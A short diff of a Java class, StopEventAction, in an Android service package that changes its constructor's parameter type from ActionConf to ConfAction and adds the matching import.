@@ -3,13 +3,14 @@ package com.android.service.action;
 import org.json.JSONObject;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.event.EventManager;
 import com.android.service.util.Check;
 
 public class StopEventAction extends EventAction {
 	private static final String TAG = "StopEventAction";
 
-	public StopEventAction(ActionConf params) {
+	public StopEventAction(ConfAction params) {
 		super( params);
 	}
 
